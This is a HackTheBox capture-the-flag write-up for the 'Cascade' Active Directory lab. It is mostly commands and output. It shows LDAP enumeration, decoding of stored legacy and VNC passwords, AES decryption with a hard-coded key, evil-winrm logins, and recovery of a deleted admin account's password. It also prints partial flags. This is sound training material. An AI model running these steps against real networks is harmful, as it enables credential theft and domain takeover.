# HackTheBox - Cascade



![](/home/strawhack/Videos/Youtube_myVideo/HTB/Cascade/Picture/Mainimage.png)



HackTheBox also called as HTB in short, is a platform which host a large number of vulnerable machines. This gives opportunity for students, pen-tester, researchers and other enthusiast to carry out pen-testing to improve their skills. The aim of the vulnerable box is to exploit the various vulnerabilities present on the box and to obtain the User and Root flag.  

Today we are going to look at a box named Cascade which is created by VbScrub. The box is rated as medium on HTB platform and is hosted on Windows OS.

## Initial Scanning

Lets use the tool named Nmap to check the open ports on the target machine.

```bash
nmap -sC -sV -A 10.10.10.182

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-07-23 03:36:26Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```

From the Nmap result, we find some interesting ports opened especially Port 389, Port 445.

We also find the domain name as cascade.local from Nmap result. Make an entry in /etc/hosts 

```bash
vim /etc/hosts
127.0.0.1	   localhost
127.0.1.1	   linux
10.10.10.182   cascade.local
```

Since LDAP port is open, lets enumerate this port using the tool ldapsearch

```bash
ldapsearch -h 10.10.10.182 -x -b "dc=cascade,dc=local" '(objectclass=Person)' | grep -i samaccountname > user.txt
sAMAccountName: CascGuest
sAMAccountName: CASC-DC1$
sAMAccountName: arksvc
sAMAccountName: s.smith
sAMAccountName: r.thompson
sAMAccountName: util
sAMAccountName: j.wakefield
sAMAccountName: s.hickson
sAMAccountName: j.goodhand
sAMAccountName: a.turnbull
sAMAccountName: e.crowe
sAMAccountName: b.hanson
sAMAccountName: d.burman
sAMAccountName: BackupSvc
sAMAccountName: j.allen
sAMAccountName: i.croft
```

Extracted the Username from above result using the command

```bash
cat user.txt | awk '{print $2}'
CascGuest
CASC-DC1$
arksvc
s.smith
r.thompson
util
j.wakefield
s.hickson
j.goodhand
a.turnbull
e.crowe
b.hanson
d.burman
BackupSvc
j.allen
i.croft
```

Going through the ldapsearch output, we find password for the user "r.thompson"

```bash
ldapsearch -h 10.10.10.182 -x -b " CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local" '(objectclass=Person)'
# extended LDIF
#
# LDAPv3
# base < CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local> with scope subtree
# filter: (objectclass=Person)
# requesting: ALL
#

# Ryan Thompson, Users, UK, cascade.local
dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ryan Thompson
sn: Thompson
givenName: Ryan
distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200109193126.0Z
whenChanged: 20200723042657.0Z
displayName: Ryan Thompson
uSNCreated: 24610
memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
uSNChanged: 319585
name: Ryan Thompson
objectGUID:: LfpD6qngUkupEy9bFXBBjA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 132247339091081169
lastLogoff: 0
lastLogon: 132247339125713230
pwdLastSet: 132230718862636251
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: r.thompson
sAMAccountType: 805306368
userPrincipalName: r.thompson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132399520173820722
msDS-SupportedEncryptionTypes: 0
cascadeLegacyPwd: clk0bjVldmE=
```

The password is base64 encoded. So we decode to plain text.

```bash
echo "clk0bjVldmE=" | base64 -d; echo
rY4n5eva
```

> Password for User r.thompson
>
> __r.thompson:rY4n5eva__

With password in hand for r.thompson, lets check the share the user can access. This is done by using the tool Smbclient.


```bash
smbclient -L //10.10.10.182 -U r.thompson
Enter WORKGROUP\r.thompson's password:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        Audit$          Disk
        C$              Disk      Default share
        Data            Disk
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        print$          Disk      Printer Drivers
        SYSVOL          Disk      Logon server share
        
```

Also using the smbmap to check the shares that are accessible for the user r.thompson

```bash
smbmap -u r.thompson -p rY4n5eva -H 10.10.10.182

[+] IP: 10.10.10.182:445        Name: 10.10.10.182              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Audit$                                                  NO ACCESS
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        print$                                                  READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share
```

From the above results, it is clear that r.thompson can access the share named __"Data"__

Using smbclient, lets login 

```bash
smbclient //10.10.10.182/Data -U r.thompson
Enter WORKGROUP\r.thompson's password:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jan 27 08:57:34 2020
  ..                                  D        0  Mon Jan 27 08:57:34 2020
  Contractors                         D        0  Mon Jan 13 07:15:11 2020
  Finance                             D        0  Mon Jan 13 07:15:06 2020
  IT                                  D        0  Tue Jan 28 23:34:51 2020
  Production                          D        0  Mon Jan 13 07:15:18 2020
  Temps                               D        0  Mon Jan 13 07:15:15 2020

                13106687 blocks of size 4096. 7793992 blocks available
```

As we go through every folder, we find some files stored in __"IT"__.  Lets dump all the files from the folder __"IT"__

```bash
smbget -R smb://10.10.10.182/Data/IT -U r.thompson
Password for [r.thompson] connecting to //Data/10.10.10.182:
Using workgroup WORKGROUP, user r.thompson
smb://10.10.10.182/Data/IT/Email Archives/Meeting_Notes_June_2018.html
smb://10.10.10.182/Data/IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log
smb://10.10.10.182/Data/IT/Logs/DCs/dcdiag.log
smb://10.10.10.182/Data/IT/Temp/s.smith/VNC Install.reg
Downloaded 12.18kB in 20 seconds
```

Going through the folders __"Email Archives"__, we find a file named __"Meeting_Notes_June_2018.html"__. The content as reads below:

```python
From:                                         Steve Smith
To:                                           IT (Internal)
Sent:                                         14 June 2018 14:07
Subject:                                      Meeting Notes

For anyone that missed yesterday’s meeting (I’m looking at you Ben). Main points are below:

-- New production network will be going live on Wednesday so keep an eye out for any issues.

-- We will be using a temporary account to perform all tasks related to the network migration and this account will be deleted at the end of 2018 once the migration is complete. This will allow us to identify actions related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password).

-- The winner of the “Best GPO” competition will be announced on Friday so get your submissions in soon.

Steve
```

Make a note, Password for the user administrator is same as TempAdmin

In folder __"Logs"__, we find another folder named __"Ark AD Recycle Bin"__ which contains a file __"ArkAdRecycleBin.log"__. The content of the log:

```python
1/10/2018 15:43	[MAIN_THREAD]	** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
1/10/2018 15:43	[MAIN_THREAD]	Validating settings...
1/10/2018 15:43	[MAIN_THREAD]	Error: Access is denied
1/10/2018 15:43	[MAIN_THREAD]	Exiting with error code 5
2/10/2018 15:56	[MAIN_THREAD]	** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
2/10/2018 15:56	[MAIN_THREAD]	Validating settings...
2/10/2018 15:56	[MAIN_THREAD]	Running as user CASCADE\ArkSvc
2/10/2018 15:56	[MAIN_THREAD]	Moving object to AD recycle bin     CN=Test,OU=Users,OU=UK,DC=cascade,DC=local
2/10/2018 15:56	[MAIN_THREAD]	Successfully moved object. New location CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
2/10/2018 15:56	[MAIN_THREAD]	Exiting with error code 0	
8/12/2018 12:22	[MAIN_THREAD]	** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
8/12/2018 12:22	[MAIN_THREAD]	Validating settings...
8/12/2018 12:22	[MAIN_THREAD]	Running as user CASCADE\ArkSvc
8/12/2018 12:22	[MAIN_THREAD]	Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
8/12/2018 12:22	[MAIN_THREAD]	Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
8/12/2018 12:22	[MAIN_THREAD]	Exiting with error code 0
```

From above, we know that ArkSvc has deleted a Object (TempAdmin) to Recycle Bin.

Finally going through the last folder __"Temp"__, we see a folder named __"s.smith"__ which contain a file named __"VNC Install.reg"__. The Content of which is:

```bash
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
"ExtraPorts"=""
"QueryTimeout"=dword:0000001e
"QueryAcceptOnTimeout"=dword:00000000
"LocalInputPriorityTimeout"=dword:00000003
"LocalInputPriority"=dword:00000000
"BlockRemoteInput"=dword:00000000
"BlockLocalInput"=dword:00000000
"IpAccessControl"=""
"RfbPort"=dword:0000170c
"HttpPort"=dword:000016a8
"DisconnectAction"=dword:00000000
"AcceptRfbConnections"=dword:00000001
"UseVncAuthentication"=dword:00000001
"UseControlAuthentication"=dword:00000000
"RepeatControlAuthentication"=dword:00000000
"LoopbackOnly"=dword:00000000
"AcceptHttpConnections"=dword:00000001
"LogLevel"=dword:00000000
"EnableFileTransfers"=dword:00000001
"RemoveWallpaper"=dword:00000001
"UseD3D"=dword:00000001
"UseMirrorDriver"=dword:00000001
"EnableUrlParams"=dword:00000001
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
"AlwaysShared"=dword:00000000
"NeverShared"=dword:00000000
"DisconnectClients"=dword:00000001
"PollingInterval"=dword:000003e8
"AllowLoopback"=dword:00000000
"VideoRecognitionInterval"=dword:00000bb8
"GrabTransparentWindows"=dword:00000001
"SaveLogToAllUsersPath"=dword:00000000
"RunControlInterface"=dword:00000001
"IdleTimeout"=dword:00000000
"VideoClasses"=""
"VideoRects"=""
```

From the above result, we see VNC Password of user s.smith and the password is in Hex Format.

Converting Hex to Base64 we get

```bash
echo "6b,cf,2a,4b,6e,5a,ca,0f" | xxd -r -p | base64
a88qS25ayg8=

echo "a88qS25ayg8=" | base64 -d > hash
```

Now we need to crack the hash in to plain text, we download [jeroennijhof](https://github.com/jeroennijhof)/**[vncpwd](https://github.com/jeroennijhof/vncpwd)**  from github and compile.

```bash
./vncpass hash
Password: sT333ve2
```

> Password For s.smith
>
> __s.smith:sT333ve2__

 With s.smith credential, we can login to the target using the tool "Evil-WinRM"

```bash
evil-winrm -i 10.10.10.182 -u s.smith -p sT333ve2

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\s.smith\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\s.smith\Desktop> dir


    Directory: C:\Users\s.smith\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        7/30/2020   5:39 AM             34 user.txt
-a----        3/25/2020  11:17 AM           1031 WinDirStat.lnk
```

We have the access to user.txt. Reading the first 16 character of the user.txt.

```bash
*Evil-WinRM* PS C:\Users\s.smith\Desktop> $flag = Get-Content .\user.txt -Raw
*Evil-WinRM* PS C:\Users\s.smith\Desktop> $flag.substring(0, 16)
95026596cdd098f0
```

Lets check the share's that are accessible for the user s.smith using smbclient.

```bash
smbclient -L //10.10.10.182 -U s.smith
Enter WORKGROUP\s.smith's password:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        Audit$          Disk
        C$              Disk      Default share
        Data            Disk
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        print$          Disk      Printer Drivers
        SYSVOL          Disk      Logon server share
```

Using Smbmap, 

```bash
smbmap -u s.smith -p sT333ve2 -H 10.10.10.182
[+] IP: 10.10.10.182:445        Name: 10.10.10.182              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Audit$                                                  READ ONLY
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        print$                                                  READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share
```



We see, s.smith has access to a share named __"Audit"__. Let's login using smbclient

```bash
smbclient  //10.10.10.182/Audit$ -U s.smith
Enter WORKGROUP\s.smith's password:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jan 29 23:31:26 2020
  ..                                  D        0  Wed Jan 29 23:31:26 2020
  CascAudit.exe                       A    13312  Wed Jan 29 03:16:51 2020
  CascCrypto.dll                      A    12288  Wed Jan 29 23:30:20 2020
  DB                                  D        0  Wed Jan 29 03:10:59 2020
  RunAudit.bat                        A       45  Wed Jan 29 04:59:47 2020
  System.Data.SQLite.dll              A   363520  Sun Oct 27 12:08:36 2019
  System.Data.SQLite.EF6.dll          A   186880  Sun Oct 27 12:08:38 2019
  x64                                 D        0  Mon Jan 27 03:55:27 2020
  x86                                 D        0  Mon Jan 27 03:55:27 2020

                13106687 blocks of size 4096. 7793262 blocks available
```

Download the above files on local system.  We see a folder named DB, opening which we see a file named Audit.db. The database file is of SQLite database. Lets open the database file in SQLite.

![](/home/strawhack/Videos/Youtube_myVideo/HTB/Cascade/Picture/1.png)

![](/home/strawhack/Videos/Youtube_myVideo/HTB/Cascade/Picture/2.png)



Switching to Windows Machine, I proceed by importing all the files in a tool named __"dnSpy"__.

Going through the files, i find the a hard coded key to decrypt the password.

![](/home/strawhack/Videos/Youtube_myVideo/HTB/Cascade/Picture/3.png)

Clicking DecryptString, takes us to the DecryptString function.

![](/home/strawhack/Videos/Youtube_myVideo/HTB/Cascade/Picture/4.png)

So making a note of all information which will help us to get decrypt the password.

| Detail            | Hash/Key                 |
| ----------------- | ------------------------ |
| Hash From SQLite  | BQO5l5Kj9MdErXx6Q6AGOw== |
| Secret Key        | c4scadek3y654321         |
| IV                | 1tdyjCbY1Ix49842         |
| Encryption Method | AES                      |
| Mode              | CBC                      |
| KeySizeBit        | 128                      |

Using Online tool to decrypt we get the decrypted password for the user ArkSvc

![](/home/strawhack/Videos/Youtube_myVideo/HTB/Cascade/Picture/5.png)



> Password for ArkSvc
>
> __arksvc:w3lc0meFr31nd__

Use "Evil-WinRM" to login to target with above credentials.

```ruby
evil-winrm -i 10.10.10.182 -u ArkSvc -p w3lc0meFr31nd

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\arksvc\Documents> net user ArkSvc
User name                    arksvc
Full Name                    ArkSvc
Comment
User's comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/9/2020 5:18:20 PM
Password expires             Never
Password changeable          1/9/2020 5:18:20 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/29/2020 10:05:40 PM

Logon hours allowed          All

Local Group Memberships      *AD Recycle Bin       *IT
                             *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.

```

From the notes, we know ArkSvc has deleted some object related to TempAdmin and also ArkSvc belong to group named "AD Recycle Bin".

With the command, Get-ADOjbect, we can check the objects deleted by the user ArkSvc

```bash
*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -filter 'isdeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects


Deleted           : True
DistinguishedName : CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local
Name              : CASC-WS1
                    DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
ObjectClass       : computer
ObjectGUID        : 6d97daa4-2e82-4946-a11e-f91fa18bfabe

Deleted           : True
DistinguishedName : CN=Scheduled Tasks\0ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN=Deleted Objects,DC=cascade,DC=local
Name              : Scheduled Tasks
                    DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
ObjectClass       : group
ObjectGUID        : 13375728-5ddb-4137-b8b8-b9041d1d3fd2

Deleted           : True
DistinguishedName : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
Name              : {A403B701-A528-4685-A816-FDEE32BDDCBA}
                    DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
ObjectClass       : groupPolicyContainer
ObjectGUID        : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e

Deleted           : True
DistinguishedName : CN=Machine\0ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN=Deleted Objects,DC=cascade,DC=local
Name              : Machine
                    DEL:93c23674-e411-400b-bb9f-c0340bda5a34
ObjectClass       : container
ObjectGUID        : 93c23674-e411-400b-bb9f-c0340bda5a34

Deleted           : True
DistinguishedName : CN=User\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local
Name              : User
                    DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
ObjectClass       : container
ObjectGUID        : 746385f2-e3a0-4252-b83a-5a206da0ed88

Deleted           : True
DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
Name              : TempAdmin
                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
ObjectClass       : user
ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059

```

Filtering for the Object TempAdmin 

```bash
*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -filter 'isdeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property * | where-object DisplayName -eq -Value "TempAdmin"


accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     :
DisplayName                     : TempAdmin
DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
givenName                       : TempAdmin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 1/27/2020 3:24:34 AM
modifyTimeStamp                 : 1/27/2020 3:24:34 AM
msDS-LastKnownRDN               : TempAdmin
Name                            : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 132245689883479503
sAMAccountName                  : TempAdmin
sDRightsEffective               : 0
userAccountControl              : 66048
userPrincipalName               : TempAdmin@cascade.local
uSNChanged                      : 237705
uSNCreated                      : 237695
whenChanged                     : 1/27/2020 3:24:34 AM
whenCreated                     : 1/27/2020 3:23:08 AM
```

We see the password "cascadeLegacyPwd: YmFDVDNyMWFOMDBkbGVz". The password is in Base64. Decoding the password

```css
echo "YmFDVDNyMWFOMDBkbGVz" | base64 -d
baCT3r1aN00dles
```

In the note, it was said, Admin password is same as TempAdmin password. Lets login as administrator using TempAdmin Base64 decoded password

```bash
evil-winrm -i 10.10.10.182 -u administrator -p baCT3r1aN00dles

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        7/30/2020   5:39 AM             34 root.txt
-a----        3/25/2020  11:17 AM           1031 WinDirStat.lnk
```

Reading the first 16 character of the password.

```bash
*Evil-WinRM* PS C:\Users\Administrator\Desktop> $flag = Get-Content root.txt -Raw
*Evil-WinRM* PS C:\Users\Administrator\Desktop> $flag.substring(0, 16)
e14eb67bbc4a105b
```



## Website referred

| Description                    | WebSite                                                      |
| ------------------------------ | ------------------------------------------------------------ |
| SQLite Online                  | https://sqliteonline.com/                                    |
| Cracking VNC Password          | https://github.com/jeroennijhof/vncpwd                       |
| AES Decryption                 | https://www.devglan.com/online-tools/aes-encryption-decryption |
| AD Recycle Bin Object Recovery | https://www.poweradmin.com/blog/restoring-deleted-objects-from-active-directory-using-ad-recycle-bin/ |

